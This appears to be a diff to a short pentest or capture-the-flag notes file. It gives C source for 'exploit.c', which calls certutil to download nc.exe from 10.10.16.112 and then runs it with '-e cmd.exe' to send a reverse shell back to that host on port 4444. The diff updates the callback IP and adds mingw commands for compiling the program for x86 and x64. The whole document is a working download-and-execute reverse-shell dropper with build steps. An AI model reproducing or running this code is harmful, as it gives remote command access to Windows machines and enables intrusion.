@@ -15,9 +15,17 @@ Write a simple code in c (exploit.c)
 int main()
 {
 	system("certutil -urlcache -split -f http://10.10.16.112/nc.exe nc66.exe");      
-    system("nc66.exe -e cmd.exe 192.168.130.1 4444");
+    system("nc66.exe -e cmd.exe 10.10.16.112 4444");
     return 0;
 }
 
 Compile it for 64 bit 
 i686-w64-mingw32-g++ exploit.c -o reverseShell.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+
+
+
+
+##for x64 
+x86_64-w64-mingw32-gcc shell.c -o shell.exe
+##for x86
+i686-w64-mingw32-gcc shell.c -o shell.exe
